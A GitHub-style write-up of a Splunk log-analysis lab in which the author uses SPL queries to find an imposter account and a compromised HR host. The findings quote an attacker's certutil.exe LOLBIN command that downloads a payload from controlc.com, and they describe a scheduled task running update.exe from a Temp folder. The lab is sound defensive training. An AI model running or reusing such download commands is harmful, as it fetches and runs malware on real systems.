# Splunk-Lab

## Objective

Identify and Investigate an Infected Host

One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.

About the Network Information:
The network is divided into three logical segments. It will help in the investigation.

### IT Department

James, Moin, Katrina

### HR department

Haroon, Chris, Diana

### Marketing department

Bell, Amelia, Deepak


## Skills Learned

- Splunk Fundamentals
- Log Analysis
- Search Processing Language (SPL) Proficiency
- Incident Investigation with Splunk
- Identifying Indicators of Compromise (IOCs)
- Hands-on SIEM Skills

### Tools Used

- Splunk.


## Steps

### Task 1: Analyze the logs from March 2022 to identify the imposter account.

Procedure:

1. Connect to index=win_eventlogs and set the date range to March 2022.
2. Analyze the UserName field for unusual entries.
   
Outcome: Using the query index=win_eventlogs | top limit=11 UserName, an imposter account named Amel1a was identified at the bottom of the results in the visualization tab, indicating suspicious activity.

Visual: Visualization of top 11 usernames, highlighting the imposter account.

![image](https://github.com/user-attachments/assets/7b54383e-05ff-4a13-a04a-d6a62ca715ec) 

### Task 2: Investigate the HR department.

Procedure:

1. Search within the HR department logs using the query index=win_eventlogs HostNames="*HR*".
2. Examine rare values in the CommandLine field for anomalies.

Visual: CommandLine, Rare Values

![image](https://github.com/user-attachments/assets/26e7ff4e-267e-496c-8e46-16c012fe0e55) 

Visual: Two suspicious activities were observed. 

![image](https://github.com/user-attachments/assets/812b2fb0-1d92-44ef-b4b1-5936ce234543) 



First im going to focus on the bottom one and create a new search with that value:

Visual: New search with the value mentioned above.

![image](https://github.com/user-attachments/assets/f751d7c3-b3ce-4b1c-97bf-c166c7912d61) 

From here I observed that the user Chris.fort from the HR department is running schedulded tasks. Creating a scheduled task to run an executable from a temporary directory (such as AppData\Local\Temp) can be suspicious, as this is a common technique used by malware to maintain persistence on a system. So this could mean that update.exe is an unknown or potentially harmful file.


Shifting focus to the first suspicious command line instance, I searched for the value certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe. This revealed that the LOLBIN certutil.exe was used to download a malicious payload from the file-sharing host controlc.com.

Visual: CommandLine logs and details of the certutil.exe activity.

![image](https://github.com/user-attachments/assets/20c5bfd3-ab2d-40f8-9c76-564c6e2a31cf) 

Outcome:

- User Haroon used certutil.exe (a LOLBIN) to download a payload from https://controlc.com/e4d11035, indicating the use of a file-sharing service (controlc.com) to deliver the benign.exe malware file.
 
Details of the Findings:

- LOLBIN used: certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
  
- Purpose of certutil.exe: Originally designed for certificate management but abused to download files from the internet.
  
- How LOLBINs Are Used in Attacks: Persistence, defense evasion, and command-and-control are common uses of LOLBINs, which makes their detection challenging.
  
Infected Host Activity:

- User: Haroon

- Third-party site: controlc.com

- Malicious file downloaded: benign.exe

- URL: https://controlc.com/e4d11035

- Date: March 4, 2022


## Conclusion

This project successfully identified an imposter account within event logs and detected suspicious activities in the HR department. Through analysis of LOLBINs and scheduled tasks, we uncovered potential malware persistence and malicious file downloads, demonstrating the importance of log analysis in detecting threats.






































